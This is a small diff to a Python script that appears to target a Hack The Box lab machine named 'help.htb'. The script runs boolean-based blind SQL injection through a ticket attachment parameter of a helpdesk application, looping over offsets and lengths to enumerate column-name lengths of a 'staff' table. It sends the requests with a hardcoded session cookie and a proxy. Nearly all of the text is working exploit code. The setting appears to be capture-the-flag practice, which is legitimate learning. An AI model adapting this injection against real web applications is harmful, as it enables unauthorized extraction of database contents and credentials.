@@ -17,19 +17,20 @@ headers = {'Cookie': 'lang=english; PHPSESSID=20q6sd4sfdodqrkk71u2cu7701; usrhas
 def lenColumn():
 
 
-   for n in string.digits[0:20]:
+   for n in range(0,20):
+      m = str(n)
 
 
 
 
 
-      url = "http://help.htb/support/?v=view_tickets&action=ticket&param%5B%5D=4&param%5B%5D=attachment&param%5B%5D=1&param%5B%5D=6+AND+(SELECT+LENGTH(column_name)+FROM+information_schema.columns+WHERE+table_schema%3ddatabase()+AND+table_name%3d'staff'+LIMIT+"+ n +",1)%3d" 
+      url = "http://help.htb/support/?v=view_tickets&action=ticket&param%5B%5D=4&param%5B%5D=attachment&param%5B%5D=1&param%5B%5D=6+AND+(SELECT+LENGTH(column_name)+FROM+information_schema.columns+WHERE+table_schema%3ddatabase()+AND+table_name%3d'staff'+LIMIT+"+ m +",1)%3d" 
 
-      for i in string.digits[1:25]:
+      for i in range(0,25):
 
-         
+         j = str(i)
 
-         part1 = url + i + "+--+-"
+         part1 = url + j + "+--+-"
 
          r = requests.get(part1, headers=headers, proxies=proxies, verify=False)
 
